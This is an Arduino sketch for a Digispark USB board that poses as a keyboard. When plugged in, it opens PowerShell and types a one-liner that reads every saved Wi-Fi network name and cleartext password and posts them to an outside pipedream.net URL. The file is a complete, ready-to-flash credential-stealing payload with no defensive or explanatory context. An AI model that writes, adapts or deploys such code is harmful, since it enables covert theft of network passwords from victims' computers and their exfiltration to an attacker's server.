#include "DigiKeyboard.h"

void setup() 
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);

  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("netsh wlan show profiles | % {if ($_ -match \": (.+)\") {$s=$matches[1];$p=(netsh wlan show profile $s key=clear | sls \"Key Content\").ToString().Split(':')[1].Trim();irm https://eo46sldpibjsskq.m.pipedream.net -Method POST -Body \"SSID=$s`nPASS=$p\"}}; exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
  // Main code to run repeatedly
}
